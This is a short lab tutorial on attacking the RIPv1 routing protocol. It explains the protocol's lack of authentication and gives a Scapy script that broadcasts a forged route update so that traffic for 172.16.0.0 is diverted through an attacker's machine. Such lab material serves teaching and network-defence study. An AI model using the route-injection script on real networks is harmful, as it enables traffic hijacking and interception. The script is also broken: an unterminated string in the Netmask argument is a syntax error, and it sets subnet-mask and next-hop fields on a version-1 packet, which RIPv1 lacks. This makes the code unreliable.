# Attacking RIPv1


## Introduction

Routing protocols are critical for communication between routers in a network. They enable routers to exchange information about available paths and decide the best route to forward data. One such protocol is the Routing Information Protocol version 1 (RIPv1), a distance-vector protocol introduced in the 1980s. However, RIPv1 lacks modern security mechanisms, making it vulnerable to a variety of attacks.

In this lab, you will learn about the RIPv1 protocol, understand its limitations, and exploit its insecurities by injecting malicious routes into a network using crafted packets.


## RIPv1 101

- How RIPv1 works:
	- RIPv1 is a distance-vector routing protocol
	- Routers using RIPv1 exchange routing updates via broadcast (destination: 255.255.255.255) every 30 seconds.
	- Metrics are used to determine the shortest path, with values ranging from 1 to 15. A metric of 16 indicates an unreachable route.
	- RIPv1 does not support authentication, subnet masks, or modern features like VLSM (Variable Length Subnet Masking).

- Why is RIPv1 not secure:
	- No Authentication: Any device can send RIPv1 updates, and routers will trust them blindly.
	- No Encryption: Updates are sent in plaintext, making it easy to intercept and analyze.
	- Broadcast Vulnerability: Updates are sent to all devices in the broadcast domain, increasing attack surface.

## Objective of the lab

- The goal of this lab is to illustrate how insecure RIPv1 is by exploiting its lack of authentication and injecting a fake route into the network. You will:
	- Craft a malicious RIPv1 packet.
	- Send the packet to the network.
	- Observe how routers add the fake route to their routing tables.


## What we will exploit

- We will exploit the following weaknesses in the RIPv1 protocol :
	- Routers accept any update without verifying the source
	- The communication is made through broadcast, so all RIPv1 routers will receive and process the updates
	- There is no authentication needed to participate to the RIP "conversation"

Knowing all these facts, we will advertise fake routes to a target network, with a very low metric, so that the traffic goes through a device that we control.


Example Python code to advertise false routes

```python

from scapy.all import *

rip_entry = RIPEntry(AF=2, RouteTag=0, IPAddr="172.16.0.0", Netmask="255.255.255.0, NextHop="0.0.0.0", Metric=1)

rip_packet = RIP(cmd=2, version=1, entries=[rip_entry])

udp = UDP(sport=520, dport=520)
ip = IP(src="192.168.1.78", dst="255.255.255.255")
packet = ip / udp / rip_packet

send(packet, iface="eth0")

```

